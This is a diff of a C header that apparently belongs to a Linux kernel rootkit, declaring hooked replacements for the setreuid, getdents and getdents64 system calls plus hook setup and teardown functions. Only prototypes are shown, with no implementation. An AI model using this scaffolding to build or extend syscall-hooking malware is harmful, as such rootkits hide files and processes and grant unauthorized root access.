@@ -72,13 +72,16 @@ char *strnstr(const char *haystack, const char *needle, size_t n);
 void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
 void *memstr(const void *haystack, const char *needle, size_t size);
 
-extern asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
-asmlinkage int new_setreuid(uid_t ruid, uid_t euid);
+//extern asmlinkage long (*sys_setreuid)(uid_t ruid, uid_t euid);
+asmlinkage long n_sys_setreuid(uid_t ruid, uid_t euid);
 
-extern asmlinkage int (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+//extern asmlinkage int (*sys_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int n_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
-extern asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
-asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+//extern asmlinkage int (*sys_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage int n_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+
+void init_hooks(void);
+void exit_hooks(void);
 
 #endif
